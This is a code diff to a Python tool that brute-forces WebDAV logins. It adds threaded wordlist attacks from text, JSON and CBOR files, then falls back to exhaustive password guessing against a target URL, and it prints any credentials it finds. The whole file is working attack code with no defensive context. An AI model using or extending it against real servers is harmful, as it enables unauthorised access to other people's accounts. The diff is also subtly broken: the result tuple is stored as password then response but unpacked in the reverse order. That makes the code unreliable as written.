@@ -13,10 +13,13 @@
 import argparse
 import base64
 import itertools
+import json
 import string
 import threading
 import time
+from typing import Tuple
 
+import cbor
 import requests
 
 
@@ -74,6 +77,24 @@ parser.add_argument(
     default="a"
 )
 
+parser.add_argument(
+    "--passwords",
+    type=argparse.FileType("r"),
+    help="A file with passwords separated by \\n. After the file has been tried, the normal burte force mode turns on"
+)
+
+parser.add_argument(
+    "--json_passwords",
+    type=argparse.FileType("r"),
+    help="A JSON file with passwords. After the file has been tried, the normal burte force mode turns on"
+)
+
+parser.add_argument(
+    "--cbor_passwords",
+    type=argparse.FileType("rb"),
+    help="A CBOR file with passwords. After the file has been tried, the normal burte force mode turns on"
+)
+
 
 # get command line args
 args = parser.parse_args()
@@ -102,11 +123,63 @@ class WEBDAV:
         self.started = False
         self.exit = None
 
-    def run(self):
+    def run(self) -> Tuple[requests.Request, str]:
+        # brute force password file
+        if args.passwords is not None:
+            passwords = []
+            for password in args.passwords:
+                while True:
+                    if self.exit is not None:
+                        return self.exit
+                    if threading.active_count() < args.threads + 1:
+                        passwords.append(password.strip())
+                        if len(passwords) > 100:
+                            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] password list")
+                            threading.Thread(target=self.check_passwords, daemon=True, args=(passwords,)).start()
+                            passwords = []
+                        break
+                    time.sleep(0.1)
+            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] password list end")
+            self.check_passwords(passwords)
+        # brute force JSON password file
+        if args.json_passwords is not None:
+            passwords = []
+            for password in json.load(args.json_passwords):
+                while True:
+                    if self.exit is not None:
+                        return self.exit
+                    if threading.active_count() < args.threads + 1:
+                        passwords.append(password)
+                        if len(passwords) > 100:
+                            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] JSON password list")
+                            threading.Thread(target=self.check_passwords, daemon=True, args=(passwords,)).start()
+                            passwords = []
+                        break
+                    time.sleep(0.1)
+            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] JSON password list end")
+            self.check_passwords(passwords)
+        # brute force CBOR password file
+        if args.cbor_passwords is not None:
+            passwords = []
+            for password in cbor.load(args.cbor_passwords):
+                while True:
+                    if self.exit is not None:
+                        return self.exit
+                    if threading.active_count() < args.threads + 1:
+                        passwords.append(password)
+                        if len(passwords) > 100:
+                            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] CBOR password list")
+                            threading.Thread(target=self.check_passwords, daemon=True, args=(passwords,)).start()
+                            passwords = []
+                        break
+                    time.sleep(0.1)
+            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] CBOR password list end")
+            self.check_passwords(passwords)
+        # standard berute force
         i = len(args.start)
         while True:
             i += 1
-            for j in map("".join, itertools.product(letters, repeat=i - 1)):
+            for j in map("".join, itertools.product(letters, repeat=i-1)):
                 while True:
                     if self.exit is not None:
                         return self.exit
@@ -120,39 +193,44 @@ class WEBDAV:
                         break
                     time.sleep(0.1)
 
-    def brute_force(self, start):
+    def check(self, password) -> None:
+        # check for rights
+        r = dav.request(
+            "PROPFIND",
+            url,
+            headers={
+                "Depth": "1"
+            },
+            auth=(
+                args.username,
+                password
+            )
+        )
+        # evaluate the response of the server
+        if r.status_code != 401:
+            self.exit = password, r
+
+    def brute_force(self, start) -> None:
         for i in range(2):
-            for j in map("".join, itertools.product(letters, repeat=i + 1)):
-                # check for rights
-                r = dav.request(
-                    "PROPFIND",
-                    url,
-                    headers={
-                        "Depth": "1"
-                    },
-                    auth=(
-                        args.username,
-                        f"{start}{j}"
-                    )
-                )
-                # evaluate the response of the server
-                if r.status_code != 401:
-                    self.exit = {
-                        "response": r,
-                        "password": f"{start}{j}"
-                    }
+            for j in map("".join, itertools.product(letters, repeat=i+1)):
+                self.check(f"{start}{j}")
+
+    def check_passwords(self, passwords) -> None:
+        for password in passwords:
+            self.check(password)
+
 
 
 webdav = WEBDAV()
-exit = webdav.run()
+r, password = webdav.run()
 
 
 print("-" * 80)
-print(exit['r'].text)
+print(r.text)
 print("-" * 80)
-print(exit['r'].status_code)
+print(r.status_code)
 print("-" * 80)
-print(exit['r'].headers)
+print(r.headers)
 print("-" * 80)
 print(f"USER: {args.username}")
-print(f"PASSWORD: {exit['password']}")
+print(f"PASSWORD: {password}")
